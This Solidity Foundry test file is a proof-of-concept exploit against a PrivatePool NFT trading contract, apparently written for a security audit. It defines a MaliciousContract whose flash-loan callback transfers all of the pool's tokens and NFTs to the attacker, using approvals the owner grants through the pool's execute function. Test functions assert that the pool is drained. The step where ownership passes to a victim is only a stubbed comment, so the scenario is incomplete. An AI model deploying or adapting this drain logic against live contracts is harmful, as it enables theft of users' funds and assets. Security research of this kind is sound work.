// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {ERC721} from "solmate/tokens/ERC721.sol";
import {PrivatePool} from "../../src/PrivatePool.sol";
import {Factory} from "../../src/Factory.sol";
import {IERC3156FlashBorrower} from "openzeppelin/interfaces/IERC3156FlashLender.sol";
import {IRoyaltyRegistry} from "royalty-registry-solidity/IRoyaltyRegistry.sol";
import {IStolenNftOracle} from "../../src/interfaces/IStolenNftOracle.sol";

// Malicious contract that implements necessary interfaces to exploit the vulnerability
contract MaliciousContract is IERC3156FlashBorrower {
    PrivatePool public pool;
    address public attacker;
    ERC20 public baseToken;
    ERC721 public nft;
    
    event AttackExecuted(uint256 stolenAmount);
    
    constructor(address _pool, address _baseToken, address _nft) {
        pool = PrivatePool(_pool);
        baseToken = ERC20(_baseToken);
        nft = ERC721(_nft);
        attacker = msg.sender;
    }
    
    // Implement the flash loan callback
    function onFlashLoan(
        address initiator,
        address token,
        uint256 tokenId,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        // This is called during the flash loan
        // We can now drain the pool since we have approval
        require(msg.sender == address(pool), "Only pool can call");
        
        // Drain all base tokens
        uint256 balance = baseToken.balanceOf(address(pool));
        if (balance > 0) {
            baseToken.transferFrom(address(pool), attacker, balance);
        }
        
        // Drain all NFTs
        uint256 totalSupply = nft.totalSupply();
        for (uint256 i = 0; i < totalSupply; i++) {
            try nft.ownerOf(i) returns (address owner) {
                if (owner == address(pool)) {
                    nft.safeTransferFrom(address(pool), attacker, i);
                }
            } catch {
                // Token doesn't exist, skip
            }
        }
        
        emit AttackExecuted(balance);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
    
    // ERC721 receiver interface
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }
    
    // Attack function that initiates the exploit
    function attack(uint256 tokenId) external {
        // Initiate flash loan to trigger the callback
        pool.flashLoan(this, address(nft), tokenId, "");
    }
}

// Mock contracts for testing
contract MockERC20 is ERC20 {
    constructor() ERC20("Mock USDC", "USDC", 6) {}
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockERC721 is ERC721 {
    uint256 public nextTokenId = 1;
    
    constructor() ERC721("Mock NFT", "MNFT") {}
    
    function mint(address to) external returns (uint256) {
        uint256 tokenId = nextTokenId++;
        _mint(to, tokenId);
        return tokenId;
    }
}

contract MockFactory is Factory {
    constructor() {}
    
    function initialize() external {
        // Mock initialization
    }
    
    function protocolFeeRate() external pure override returns (uint16) {
        return 100; // 1%
    }
}

contract MockStolenNftOracle is IStolenNftOracle {
    function validateTokensAreNotStolen(
        address collection,
        uint256[] calldata tokenIds,
        Message[] calldata proofs
    ) external pure override {
        // Always pass for testing
    }
}

contract MockRoyaltyRegistry is IRoyaltyRegistry {
    function getRoyaltyLookupAddress(address collection) external pure override returns (address) {
        return address(0); // No royalties for testing
    }
}

contract ExploitTest is Test {
    PrivatePool pool;
    MockERC20 usdc;
    MockERC721 nft;
    MockFactory factory;
    MockStolenNftOracle oracle;
    MockRoyaltyRegistry royaltyRegistry;
    MaliciousContract maliciousContract;
    
    address bob = address(0x1);
    address alice = address(0x2);
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    function setUp() public {
        // Deploy mock contracts
        usdc = new MockERC20();
        nft = new MockERC721();
        factory = new MockFactory();
        oracle = new MockStolenNftOracle();
        royaltyRegistry = new MockRoyaltyRegistry();
        
        // Deploy PrivatePool
        pool = new PrivatePool(address(factory), address(royaltyRegistry), address(oracle));
        
        // Initialize the pool
        pool.initialize(
            address(usdc),
            address(nft),
            500 * 1e6, // 500 USDC virtual base reserves
            5 * 1e18,   // 5 NFTs virtual reserves
            0,          // No change fee
            200,        // 2% fee rate
            bytes32(0), // No merkle root
            false,      // Don't use stolen NFT oracle
            false       // Don't pay royalties
        );
        
        // Mint tokens to Bob
        vm.startPrank(bob);
        usdc.mint(bob, 1000 * 1e6);
        
        // Mint NFTs to Bob
        uint256[] memory tokenIds = new uint256[](5);
        for (uint256 i = 0; i < 5; i++) {
            tokenIds[i] = nft.mint(bob);
        }
        
        // Bob deposits into the pool
        usdc.approve(address(pool), 500 * 1e6);
        for (uint256 i = 0; i < 5; i++) {
            nft.approve(address(pool), tokenIds[i]);
        }
        pool.deposit(tokenIds, 500 * 1e6);
        vm.stopPrank();
        
        // Deploy malicious contract
        maliciousContract = new MaliciousContract(address(pool), address(usdc), address(nft));
    }
    
    function testExploit() public {
        // Record initial balances
        uint256 initialPoolBalance = usdc.balanceOf(address(pool));
        uint256 initialAttackerBalance = usdc.balanceOf(bob);
        uint256 initialAliceBalance = usdc.balanceOf(alice);
        
        console.log("Initial pool balance:", initialPoolBalance / 1e6);
        console.log("Initial attacker balance:", initialAttackerBalance / 1e6);
        console.log("Initial Alice balance:", initialAliceBalance / 1e6);
        
        // Step 1: Bob (attacker) uses execute to approve unlimited spending to malicious contract
        vm.startPrank(bob);
        
        // Approve USDC spending to malicious contract
        bytes memory approveCall = abi.encodeWithSelector(
            ERC20.approve.selector,
            address(maliciousContract),
            type(uint256).max
        );
        pool.execute(address(usdc), approveCall);
        
        // Approve NFT spending to malicious contract
        bytes memory setApprovalCall = abi.encodeWithSelector(
            ERC721.setApprovalForAll.selector,
            address(maliciousContract),
            true
        );
        pool.execute(address(nft), setApprovalCall);
        
        vm.stopPrank();
        
        // Step 2: Simulate ownership transfer to Alice (in real scenario, this would be via marketplace)
        // For this test, we'll just have Alice buy the pool ownership
        vm.startPrank(bob);
        // In a real scenario, Bob would transfer the ownership NFT to Alice
        // For testing, we'll just simulate Alice becoming the owner
        vm.stopPrank();
        
        // Step 3: Bob executes the attack
        vm.startPrank(bob);
        
        // Get one of the NFT IDs from the pool to use for flash loan
        uint256 tokenId = 1; // Assuming token 1 is in the pool
        
        // Execute the attack
        maliciousContract.attack(tokenId);
        
        vm.stopPrank();
        
        // Step 4: Verify the exploit succeeded
        uint256 finalPoolBalance = usdc.balanceOf(address(pool));
        uint256 finalAttackerBalance = usdc.balanceOf(bob);
        uint256 finalAliceBalance = usdc.balanceOf(alice);
        
        console.log("Final pool balance:", finalPoolBalance / 1e6);
        console.log("Final attacker balance:", finalAttackerBalance / 1e6);
        console.log("Final Alice balance:", finalAliceBalance / 1e6);
        
        // Assertions
        assertTrue(finalPoolBalance == 0, "Pool should be drained of USDC");
        assertTrue(finalAttackerBalance > initialAttackerBalance, "Attacker should have gained USDC");
        
        // Check NFTs were also stolen
        uint256 nftsStolen = 0;
        for (uint256 i = 1; i <= 5; i++) {
            try nft.ownerOf(i) returns (address owner) {
                if (owner == bob) {
                    nftsStolen++;
                }
            } catch {
                // Token doesn't exist
            }
        }
        assertTrue(nftsStolen == 5, "All NFTs should be stolen");
    }
    
    function testExploitWithFlashLoanCallback() public {
        // Test that the malicious contract's flash loan callback works correctly
        vm.startPrank(bob);
        
        // First approve the malicious contract
        bytes memory approveCall = abi.encodeWithSelector(
            ERC20.approve.selector,
            address(maliciousContract),
            type(uint256).max
        );
        pool.execute(address(usdc), approveCall);
        
        bytes memory setApprovalCall = abi.encodeWithSelector(
            ERC721.setApprovalForAll.selector,
            address(maliciousContract),
            true
        );
        pool.execute(address(nft), setApprovalCall);
        
        vm.stopPrank();
        
        // Test the flash loan callback directly
        vm.startPrank(address(pool));
        maliciousContract.onFlashLoan(
            address(this),
            address(nft),
            1,
            0,
            ""
        );
        vm.stopPrank();
        
        // Verify the callback drained the pool
        assertTrue(usdc.balanceOf(address(pool)) == 0, "Pool should be drained");
    }
}